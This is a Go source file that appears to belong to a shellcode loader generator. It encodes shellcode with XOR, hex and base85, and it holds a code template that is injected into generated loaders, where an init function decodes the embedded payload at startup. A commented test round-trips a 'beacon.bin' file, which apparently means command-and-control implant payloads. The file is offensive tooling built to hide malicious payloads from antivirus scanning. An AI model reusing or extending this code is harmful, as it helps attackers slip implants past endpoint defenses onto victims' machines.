package encode

import (
	_ "embed"
	"encoding/hex"
	"github.com/darkwyrm/b85"
)

var (
	Decode1string = []string{
		`
//go:embed key
var key []byte

func init() {
	//__FENLI__
	shellcode, _ = b85.Decode(string(shellcode))
	shellcode, _ = hex.DecodeString(string(shellcode))
	shellcode = Xor(shellcode, key)
}
func Xor(shellcode []byte, Key []byte) []byte {
	var result []byte
	for i := 0; i < len(shellcode); i++ {
		result = append(result, shellcode[i]^Key[i%len(Key)])
	}
	return result
}`, `
	"encoding/hex"
	"github.com/darkwyrm/b85"
	//__IMPORT__`,
	}
)

//xor + hex + base85

func Encode1(shellcode []byte, key []byte) []byte {
	var encodedbyte []byte
	encodedbyte = Xor(shellcode, key)
	encodedbyte = []byte(hex.EncodeToString(encodedbyte))
	encodedbyte = []byte(b85.Encode(encodedbyte))
	return encodedbyte
}

func Decode1(encodedbyte []byte, key []byte) []byte {
	var shellcode []byte
	shellcode, _ = b85.Decode(string(encodedbyte))
	shellcode, _ = hex.DecodeString(string(shellcode))
	shellcode = Xor(shellcode, key)
	return shellcode
}

//success
//func test() {
//	key := []byte("testtest")
//	testbyte, _ := ioutil.ReadFile("beacon.bin")
//	beforebyte := testbyte
//	encodedbyte := encode1(testbyte, key)
//	afterbyte := decode1(encodedbyte, key)
//	if bytes.Equal(afterbyte, beforebyte) {
//		println("success")
//	}
//}
